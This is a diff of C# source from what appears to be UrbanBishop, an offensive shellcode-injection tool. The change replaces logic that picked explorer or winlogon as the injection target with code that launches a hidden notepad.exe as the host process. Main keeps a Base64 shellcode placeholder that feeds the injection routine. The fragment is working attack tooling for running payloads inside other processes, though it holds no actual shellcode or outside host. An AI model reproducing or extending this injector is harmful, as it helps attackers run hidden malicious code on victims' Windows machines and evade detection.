@@ -116,7 +116,6 @@ namespace UrbanBishop
             }
         }
 
-        // Add functions to automate PID searching
         public static bool IsAdministrator()
         {
             using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
@@ -125,31 +124,33 @@ namespace UrbanBishop
                 return principal.IsInRole(WindowsBuiltInRole.Administrator);
             }
         }
-        public static Int32 FindProcId(string processname)
+
+        public static Int32 NewProcess()
         {
-            Int32 pid = 0;
-            Int32 session = Process.GetCurrentProcess().SessionId;
-            Process[] procs = Process.GetProcessesByName(processname);
-            foreach (Process proc in procs)
-            {
-                if (proc.SessionId == session)
-                {
-                    return proc.Id;
-                }
+            Process process = new Process();
+            // Configure the process using the StartInfo properties.
+            process.StartInfo.FileName = "C:\\windows\\system32\\notepad.exe";
+            process.StartInfo.Arguments = null;
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            if(IsAdministrator()){
+                process.StartInfo.UseShellExecute = true;
             }
-            return pid;
+            process.Start();
+            return process.Id;
         }
 
         static void Main(string[] args)
         {
             Boolean Clean = false;
             
-            
-            String B64 = @"REPLACETHISWITHSHELLCODE";
 
+            String B64 = @"REPLACETHISWITHSHELLCODE";
             
+
             try{
-                Int32 Proc = (args.Length == 0) ? (IsAdministrator() ? Process.GetProcessesByName("winlogon")[0].Id : FindProcId("explorer")) : Int32.Parse(args[0]);
+                
+                Int32 Proc = (args.Length == 0) ? NewProcess() : Int32.Parse(args[0]);
                 BerlinDefence.PROC_VALIDATION pv = BerlinDefence.ValidateProc(Proc);
     
                 if (!pv.isvalid || pv.hProc == IntPtr.Zero)
